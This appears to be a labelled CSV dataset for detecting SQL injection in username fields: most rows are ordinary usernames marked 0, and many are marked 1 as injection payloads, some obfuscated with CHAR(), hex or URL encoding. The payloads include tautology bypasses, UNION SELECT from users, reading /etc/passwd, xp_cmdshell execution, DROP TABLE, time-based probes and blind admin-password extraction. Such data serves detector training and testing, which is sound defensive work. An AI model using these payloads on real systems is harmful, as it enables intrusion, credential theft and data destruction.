name,is_malicious
pamelaarroyoCHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(49)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(79)CHAR(85)CHAR(78)CHAR(84)CHAR(40)CHAR(42)CHAR(41)CHAR(44)CHAR(67)CHAR(79)CHAR(78)CHAR(67)CHAR(65)CHAR(84)CHAR(40)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(85)CHAR(82)CHAR(82)CHAR(69)CHAR(78)CHAR(84)CHAR(95)CHAR(85)CHAR(83)CHAR(69)CHAR(82)CHAR(40)CHAR(41)CHAR(41)CHAR(44)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(70)CHAR(76)CHAR(79)CHAR(79)CHAR(82)CHAR(40)CHAR(82)CHAR(65)CHAR(78)CHAR(68)CHAR(40)CHAR(48)CHAR(41)CHAR(42)CHAR(50)CHAR(41)CHAR(41)CHAR(120)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(73)CHAR(78)CHAR(70)CHAR(79)CHAR(82)CHAR(77)CHAR(65)CHAR(84)CHAR(73)CHAR(79)CHAR(78)CHAR(95)CHAR(83)CHAR(67)CHAR(72)CHAR(69)CHAR(77)CHAR(65)CHAR(46)CHAR(80)CHAR(76)CHAR(85)CHAR(71)CHAR(73)CHAR(78)CHAR(83)CHAR(32)CHAR(71)CHAR(82)CHAR(79)CHAR(85)CHAR(80)CHAR(32)CHAR(66)CHAR(89)CHAR(32)CHAR(120)CHAR(41)CHAR(97)CHAR(41)CHAR(45)CHAR(45),1
gainesmichael,0
copelandmichael,0
dyermatthew,0
vsmith,0
michaelgallegos0x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
ulee,0
rcox,0
brandi41%27 %4f%52 %53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29%3d%53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29--,1
werickson,0
lisa18,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
amann,0
megan93,0
cindyhurley,0
tiffany47,0
weberbrian,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
wibarra,0
lcurtis,0
'||'1'='1,1
sdawson,0
yolandaclay,0
taylorrobert,0
beniteztamara,0
kevinfrank,0
aacevedo,0
joannetaylor,0
adamsnicholas,0
travisdavis,0
schroederdavid,0
zachary45,0
steven57,0
rbell,0
murrayterri,0
alexandria11,0
igonzalez,0
johnbeasley,0
xhicks,0
qwall,0
rdunn,0
shawnbrown,0
gcallahan,0
erikaali,0
turnerchristopher,0
obowers,0
ujohnson,0
christopher58,0
%27%2b%28%53%45%4c%45%43%54 %27%30%27 %46%52%4f%4d %75%73%65%72%73 %57%48%45%52%45 %75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%27 %41%4e%44 %53%55%42%53%54%52%49%4e%47%28%70%61%73%73%77%6f%72%64%2c%31%2c%31%29%3d%27%61%27%29%2b%27,1
'%20OR%201=1--,1
grahamshannon,0
haleynichols,0
ugreene,0
'; EXEC xp_cmdshell('dir')--,1
laura08,0
0x270x200x4f0x520x200x300x780x350x300x3d0x300x780x350x300x2d0x2d,1
brucesantana,0
hbender,0
charlesconner,0
"ashleyfox' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
perezamber,0
floressandra,0
emilyadams,0
davidsonryan,0
jameslynch,0
hendricksmindy,0
robert74,0
alyssadavisCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
shannonmendez,0
jeremywhitney,0
kbradford,0
qwells,0
donaldcoleman,0
' UNION SELECT * FROM users--,1
khenry,0
baueralicia,0
richard42,0
lvaldez,0
marybeard,0
bfernandez,0
"olsonjohn'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
thomasbush,0
%27 %4f%52 %53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29%3d%53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29--,1
vasqueztyler,0
amberhernandez,0
angie31,0
steven74,0
ramirezcody,0
royjohnson,0
hartzachary,0
alecdavis,0
robert83'; DROP TABLE users--,1
watkinsjohn,0
robertskristi,0
zamoramegan,0
gary73,0
teresa48,0
"michaelweber' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
henryowen,0
john45,0
udavis,0
klevine,0
tcruz,0
lisafields,0
katrina20,0
jennifer46'/**/OR/**/'1'='1,1
jenniferbanks,0
gwebb,0
thomas90,0
hessjerry,0
dgriffin,0
kellywalsh,0
wendyarnold,0
gcarter,0
darren56,0
iblackburn,0
berrynathan,0
gschneider,0
christian50,0
kimberly58,0
josephbaker,0
dennisesparza,0
eromero,0
%27%2f%2a%2a%2f%4f%52%2f%2a%2a%2f%27%31%27%3d%27%31,1
matthew98,0
martinezbrian,0
jessicadickerson,0
millerraymond,0
mccoyedward,0
debbie12,0
erica23,0
natashaperez,0
victorsantos,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(40)CHAR(83)CHAR(76)CHAR(69)CHAR(69)CHAR(80)CHAR(40)CHAR(53)CHAR(41)CHAR(41)CHAR(41)CHAR(98)CHAR(65)CHAR(75)CHAR(76)CHAR(41)CHAR(45)CHAR(45),1
sarahcastro,0
nicolejones,0
luiswhite,0
kylie21,0
pricestephen,0
ksmith,0
david00,0
troybuchanan,0
chris66,0
sarah70,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
jessica54,0
amyhoward,0
sharonwade,0
toddsteven,0
lhess,0
amanda40,0
xmiller,0
randyvasquez,0
carrolljessica,0
robertoward,0
nathanlane,0
jessicaroth,0
anthony24,0
chrismiller,0
tinaking,0
jonathan28,0
bentonelizabeth,0
ana98,0
kyle65,0
kimberlychambers,0
scotthill,0
brandon57,0
danny24,0
robertperry,0
wforbes,0
kimberlyedwards,0
crystal57' UNION SELECT * FROM users--,1
sarahsmith,0
stephaniewatson,0
theresaharrison,0
james99,0
fburke,0
kschultz,0
georgeballard,0
'||'1'='1,1
angela55,0
msmith,0
zhoffman,0
zamoramichael,0
hallsteven,0
dustingarcia,0
lisawalker,0
alex06,0
holtsean,0
david59,0
jrodriguez,0
kathrynchavez,0
david51,0
blacklucas,0
hardydiana,0
harriswhitneyCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
nicholaspayne,0
maddoxcynthia,0
greenlawrence,0
shawntran,0
cynthiabass,0
nicholaslee,0
zwagner,0
sharpjill,0
sabrinaperry,0
xcrane,0
briancallahan,0
john05,0
qhobbs,0
kellerjason,0
wweaver,0
regina44,0
melissa790x270x2f0x2a0x2a0x2f0x4f0x520x2f0x2a0x2a0x2f0x270x310x270x3d0x270x31,1
harrellanne,0
gonzalezdebra,0
astephens,0
sarahhunt,0
hillrichard,0
evanhall,0
lholt,0
efisher,0
ealexander,0
william46,0
' OR CHAR(49)=CHAR(49)--,1
montesjason,0
jenniferrichardson,0
williampatel,0
oyoung,0
christopher06,0
'; DROP TABLE users--,1
odavis,0
ochandler,0
howardashley,0
sosajohn,0
ncollins,0
robert62,0
munozrachel,0
martinmaria,0
vashley,0
urobertson,0
cwalsh,0
kelleytina,0
0x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
jonesnathaniel,0
chadsantos,0
sshaw,0
samantharichardson,0
delgadorobin,0
olewis,0
nhester' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
michael39,0
tinabailey,0
julianpearson,0
micheal33,0
charles10,0
uruiz,0
0x270x7c0x7c0x270x310x270x3d0x270x31,1
steven21,0
jonathangarcia,0
ilogan,0
cookpaul,0
catherinealexander,0
jordandean,0
johnsonkevin,0
ghernandez,0
plowery,0
carolineburke,0
natashaberry,0
tiffany15,0
vanessa94,0
theresamcintyre,0
ograham,0
victoria94,0
tonypotter' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
igraham,0
graynatalie,0
amandaharvey' OR 1=1--,1
nicole78,0
smithjennifer,0
karenmcbride0x270x200x4f0x520x200x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x3d0x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x2d0x2d,1
'%20OR%201=1--,1
' OR CHAR(49)=CHAR(49)--,1
kmorgan,0
robert83,0
lucasbennett,0
jennifersanders,0
derrickpeterson,0
millsstephanie,0
loganglover,0
ashley58,0
vargasvictor,0
oliviasmith,0
daniellejohnson,0
lsmith,0
jessica21,0
debbiepham,0
noliver,0
castillomariah,0
whitekimberly,0
ericmeyer,0
eward,0
ucampbell,0
whitejames,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
christophermullen,0
chansharon,0
vcarter,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
davidlewis,0
vargasrebecca,0
leahjones,0
wanda61,0
nealalicia,0
umartin' OR CHAR(49)=CHAR(49)--,1
robertnguyen,0
cwells,0
ryanmejia,0
kristenlarsen,0
butlerrichard,0
adamhahn,0
kanejeremy,0
kevindennis,0
alexandra13,0
davisjohn,0
'; EXEC xp_cmdshell('dir')--,1
patricia68,0
lewisbrandon,0
amanda17,0
CHAR(39)CHAR(59)CHAR(32)CHAR(69)CHAR(88)CHAR(69)CHAR(67)CHAR(32)CHAR(120)CHAR(112)CHAR(95)CHAR(99)CHAR(109)CHAR(100)CHAR(115)CHAR(104)CHAR(101)CHAR(108)CHAR(108)CHAR(40)CHAR(39)CHAR(100)CHAR(105)CHAR(114)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
jesuswilliams'; DROP TABLE users--,1
jennifer06,0
CHAR(39)CHAR(124)CHAR(124)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
thompsonjoy,0
danielguzman,0
jmason,0
omyers,0
tamarawright,0
anthony34,0
%27 %41%4e%44 %28%53%45%4c%45%43%54 %31 %46%52%4f%4d%28%53%45%4c%45%43%54 %43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%30%78%33%61%2c%28%53%45%4c%45%43%54 %43%55%52%52%45%4e%54%5f%55%53%45%52%28%29%29%2c%30%78%33%61%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78 %46%52%4f%4d %49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53 %47%52%4f%55%50 %42%59 %78%29%61%29--,1
kelly45,0
samuel85,0
kennedycalvin,0
oscar63,0
andrew43,0
adrian72,0
charles71,0
john88,0
brianmason,0
0x270x200x4f0x520x200x420x450x4e0x430x480x4d0x410x520x4b0x280x310x300x300x300x300x300x300x300x2c0x4d0x440x350x280x4e0x4f0x570x280x290x290x290x2d0x2d,1
ctanner,0
boydjesse,0
ubowers,0
rachel41,0
cameron29,0
alex29,0
gregorydonaldson,0
ethanbrewer,0
thomasnicholas,0
kevin73,0
taylorking,0
patricia34,0
michael21,0
nelsonkimberly,0
kmcbride,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
ywalton,0
zhangtodd,0
samuelpowell,0
christinegriffin,0
annstevenson,0
' OR CHAR(49)=CHAR(49)--,1
tinaweaver,0
tammy67,0
krogers,0
bowersjuan,0
pamelatanner,0
smithmarcus,0
paulasmith,0
xfoster,0
roy96,0
jonesmichael,0
vparker,0
rodriguezjay,0
brentryan,0
vgreer,0
vcannon,0
unorris,0
qchase,0
jacksongwendolyn,0
dariuscole,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
crystalmaynard,0
leon75' OR '1'='1,1
' UNION SELECT * FROM users--,1
erinhouse,0
stephencooper,0
yjones,0
houstonamanda,0
eric43,0
mlopez,0
arogers,0
martinangela,0
daryl83,0
joanne54,0
duffybrian,0
debraramos,0
bellheather,0
alisoncarpenter'%20OR%201=1--,1
roydouglas,0
'/**/OR/**/'1'='1,1
valerie19,0
deanmelinda,0
forbescrystal,0
kathrynwilson,0
douglascunningham,0
kmartinez,0
jesse78,0
deborah55,0
clarkmeghan,0
khammond,0
murphydanielle,0
erica33,0
' OR 0x50=0x50--,1
bradmcguire,0
stephensrussell,0
smithamber,0
david29' OR 1=1--,1
smithdon,0
david64,0
williamlozano,0
vpierce,0
nwilson,0
hawkinskevin,0
reneemurray,0
jason50,0
ashley56,0
jennifer09,0
bankseric,0
ashley00,0
johnschad,0
richmichael,0
krista28,0
christian51,0
joehernandez,0
denisepetersenCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(69)CHAR(78)CHAR(67)CHAR(72)CHAR(77)CHAR(65)CHAR(82)CHAR(75)CHAR(40)CHAR(49)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(44)CHAR(77)CHAR(68)CHAR(53)CHAR(40)CHAR(78)CHAR(79)CHAR(87)CHAR(40)CHAR(41)CHAR(41)CHAR(41)CHAR(45)CHAR(45),1
cooktravis,0
waltersheidi,0
laramegan,0
sharonreynolds,0
wilkersonmelissa,0
diana79,0
katie51,0
fjackson,0
daniellemillerCHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(49)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(79)CHAR(85)CHAR(78)CHAR(84)CHAR(40)CHAR(42)CHAR(41)CHAR(44)CHAR(67)CHAR(79)CHAR(78)CHAR(67)CHAR(65)CHAR(84)CHAR(40)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(85)CHAR(82)CHAR(82)CHAR(69)CHAR(78)CHAR(84)CHAR(95)CHAR(85)CHAR(83)CHAR(69)CHAR(82)CHAR(40)CHAR(41)CHAR(41)CHAR(44)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(70)CHAR(76)CHAR(79)CHAR(79)CHAR(82)CHAR(40)CHAR(82)CHAR(65)CHAR(78)CHAR(68)CHAR(40)CHAR(48)CHAR(41)CHAR(42)CHAR(50)CHAR(41)CHAR(41)CHAR(120)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(73)CHAR(78)CHAR(70)CHAR(79)CHAR(82)CHAR(77)CHAR(65)CHAR(84)CHAR(73)CHAR(79)CHAR(78)CHAR(95)CHAR(83)CHAR(67)CHAR(72)CHAR(69)CHAR(77)CHAR(65)CHAR(46)CHAR(80)CHAR(76)CHAR(85)CHAR(71)CHAR(73)CHAR(78)CHAR(83)CHAR(32)CHAR(71)CHAR(82)CHAR(79)CHAR(85)CHAR(80)CHAR(32)CHAR(66)CHAR(89)CHAR(32)CHAR(120)CHAR(41)CHAR(97)CHAR(41)CHAR(45)CHAR(45),1
anthony01,0
franksmith,0
' OR CHAR(49)=CHAR(49)--,1
"donaldthomas' OR BENCHMARK(10000000,MD5(NOW()))--",1
nhill,0
"dphillips' OR BENCHMARK(10000000,MD5(NOW()))--",1
erinwhite,0
vlee,0
thomasluna,0
bradley15,0
reneepitts'%27%20OR%201=1--,1
qbrady,0
tanya34CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(73)CHAR(78)CHAR(65)CHAR(82)CHAR(89)CHAR(32)CHAR(39)CHAR(97)CHAR(39)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(45)CHAR(45),1
colerodney,0
johnhoffman,0
nicholasharvey,0
davissharon,0
tlyons,0
hharris,0
pmarshall,0
xmullins,0
feliciaroberts,0
diazeric,0
jeannemorton,0
russell40,0
dwashington,0
rachel91,0
bakeranthony,0
garrettronald,0
jacksontimothy,0
pstrickland,0
elizabeth28,0
ubenton,0
holmesmaria,0
%27%25%32%37%25%32%30%4f%52%25%32%30%31%3d%31--,1
thomasshane,0
brian80,0
nhill,0
cgonzales,0
dwilson,0
saraflores,0
jadams,0
eric51,0
brownnicholas,0
uobrien,0
alexsanders,0
jking,0
donaldmccullough,0
bmontgomery,0
suealvarez,0
davidray,0
madison55,0
hphillips,0
stanner,0
pthomas,0
iburke' OR '1'='1,1
wrightjacob,0
justinmurray,0
michelle78,0
vserrano,0
agrossCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(40)CHAR(83)CHAR(76)CHAR(69)CHAR(69)CHAR(80)CHAR(40)CHAR(53)CHAR(41)CHAR(41)CHAR(41)CHAR(98)CHAR(65)CHAR(75)CHAR(76)CHAR(41)CHAR(45)CHAR(45),1
watsonbenjamin,0
jroberts,0
elizabeth87,0
cnorton' OR 0x50=0x50--,1
sarachambers,0
wendy20CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(61)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(45)CHAR(45),1
leonardgregory%27 %4f%52 %31%3d%31--,1
pavila,0
jwilson,0
bauerthomas,0
mwalton,0
johnsontimothy%27%3b %44%52%4f%50 %54%41%42%4c%45 %75%73%65%72%73--,1
smithmichael,0
stephenmartinez,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
ohooper,0
greermatthew,0
cody03,0
bridgetgonzales,0
thomas76' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
derek13,0
danieldaniel,0
quinnadam,0
forbeskayla,0
dperez,0
dpotter,0
jenniferwilliams,0
sarah74,0
melissacasey,0
gloria97,0
donaldwatson,0
kmoore,0
amyellis,0
jeremy18,0
danadickerson,0
erin38,0
mnelson,0
lisa88,0
lorettadean,0
patricia67,0
ryanjames,0
jennifermorales,0
matthewsilva,0
gloria48,0
john67CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(61)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
wskinner,0
emily74,0
jonesdavid,0
pricetimothy,0
kevinjohnson,0
jeffreyramos,0
amy38' OR SOUNDEX('test')=SOUNDEX('test')--,1
kmorris,0
ryanschwartz,0
mariaanderson,0
perrymichael,0
lcole,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
nthompson,0
peterjohnson,0
walterwilliams,0
raymond82,0
jamie58,0
vnavarro,0
phernandez,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
nathanmcdaniel,0
nathanielharrington,0
doris47,0
araymond,0
susan29,0
bduke,0
robertrichardson,0
hhunter,0
westtimothy,0
ssanders,0
tperry,0
sperkins,0
"haneydavid' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
mario00,0
sjohnson,0
collinsjames,0
gilesjason,0
brenda31,0
"eswanson' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
brettpena,0
carlospeters,0
richardsanchez' OR 0x50=0x50--,1
richbetty,0
josephmoreno,0
longmark,0
bjones,0
wvazquez,0
qmurphy,0
lwhitehead,0
cannonlarry,0
sgoodman,0
bakerbrandon,0
alyssa44' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
sally38,0
ysullivan,0
tgibson,0
nsmith,0
nross,0
yorkkimberly,0
stephaniesimpson,0
gherman,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(61)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
dchavez,0
jenniferbrooks,0
qreese,0
shannon81,0
suttonrobert,0
mhudson,0
valerie98,0
jmarshall,0
kenneth48,0
benjamin13'; DROP TABLE users--,1
jason62,0
emendez,0
dmoore,0
preston80,0
garciarachel,0
richard06,0
schwartzkristin,0
bautistaamanda,0
'; EXEC xp_cmdshell('dir')--,1
jilldavis,0
lamconnie,0
anavarro,0
ryanwagner,0
samuel97,0
benjamin99,0
virginiathomas,0
bellphillip,0
bcastaneda,0
cassandra44,0
garciamelissa,0
moorematthew,0
qgriffin' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
jessemitchell0x270x7c0x7c0x270x310x270x3d0x270x31,1
wcummings,0
christina21,0
ppaul,0
fergusonnatalie,0
msimpson,0
ccarpenterCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
michaelsmith,0
alisonanderson,0
michaelmorse,0
'/**/OR/**/'1'='1,1
regina17,0
briansherman,0
' OR 0x50=0x50--,1
ncarroll,0
sarah64,0
william73,0
englishmaria,0
clarkcarolyn,0
kingthomas,0
qrivers,0
salvarez,0
gregory24,0
timothy35,0
brownjames,0
mcdowellandrew,0
davidedwards,0
bobwilson'; EXEC xp_cmdshell('dir')--,1
jason51,0
ysalinas,0
daniel11,0
christopher73,0
nchandler,0
bonnie46,0
thomastimothy,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
amadden,0
psoto,0
gregorystokes,0
julierice,0
robertopayne,0
tbrown,0
raymond67,0
qdavis,0
pmartinez,0
ekhan,0
johnsonsandra,0
%27%2f%2a%2a%2f%4f%52%2f%2a%2a%2f%27%31%27%3d%27%31,1
marcuskidd,0
kristin54,0
zowens,0
%27 %55%4e%49%4f%4e %41%4c%4c %53%45%4c%45%43%54 %4c%4f%41%44%5f%46%49%4c%45%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29--,1
wmarshall,0
kennedygarrett,0
jacqueline82,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
kevingarcia,0
monroebrenda,0
garyboyd,0
rmcgee,0
nfoster,0
pchavez,0
armstrongbarbara,0
santosvernon,0
zgonzalez,0
daniel98,0
drew75,0
thomas49,0
andersonjames,0
tjackson,0
echan,0
michael93,0
apittman,0
justin64,0
molly46,0
nicole78,0
lcastro,0
nclark,0
brandonhayes,0
bjacobs,0
johnsonnatalie,0
tara96,0
brycewilson,0
whitneynancy,0
bsmith,0
tayloramanda,0
'; EXEC xp_cmdshell('dir')--,1
lmacias,0
iferrell,0
ricezachary,0
logangill,0
kimberlycooper,0
eric38,0
millerkathy,0
bennettjeffery,0
jacob07,0
%27%7c%7c%27%31%27%3d%27%31,1
stephanie79,0
rachaelmolina,0
duane38,0
vargasveronica,0
wmoody,0
iboyd,0
darin92,0
carrollangel,0
elizabethcole0x270x200x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d,1
burnsmichael,0
brandyfarmer,0
robert43,0
mendozacatherine,0
rsmith,0
ewagner,0
rward,0
hnorman,0
millerjeremy,0
'/**/OR/**/'1'='1,1
joshua64,0
charlesosborn,0
wkelly,0
samuel40,0
bennettthomas,0
matthewsrobert,0
nelsonmichael,0
joshua97,0
satkinson,0
maciasdarlene,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
shaneperez,0
john54,0
joshua88' OR SOUNDEX('test')=SOUNDEX('test')--,1
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
albertelliott,0
hgibbs,0
yvazquez,0
austinjessica,0
jessica20,0
denisegarcia,0
wandawilliams'||'1'='1,1
yalexander,0
christopher24,0
deniseross,0
lwyatt,0
lisa13,0
teresaalvarez,0
joshuataylor,0
omontes,0
nancyerickson,0
nellis,0
craig25,0
pevans,0
richardbailey,0
scottcase%27%25%32%30%4f%52%25%32%30%31%3d%31--,1
torreskenneth,0
calhounamanda%27%25%32%37%25%32%30%4f%52%25%32%30%31%3d%31--,1
ymorales,0
veronica51,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
zachary49,0
leechristopher,0
josephmorgan,0
' OR 0x50=0x50--,1
hpugh,0
lisagonzalez,0
' OR 1=1--,1
odiaz,0
andersongregory,0
bradleyderrick,0
jaredwhitaker,0
cweber,0
paul82,0
svasquez,0
christina67,0
katherinebailey,0
'; EXEC xp_cmdshell('dir')--,1
debrasandoval,0
vbonilla,0
pjohnson,0
harveymelissa,0
jenniferadams,0
karenprice,0
schwartzvictoria,0
laura19,0
pattoncharles'/**/OR/**/'1'='1,1
greenjennifer,0
'%20OR%201=1--,1
emilyjordan,0
trujillomichael,0
nancysoto,0
michaelreynolds,0
nmartin,0
lperkins,0
jessicagonzales,0
grayjoy'/**/OR/**/'1'='1,1
manningpaige,0
abigailsmith,0
kyle20,0
davidwalls,0
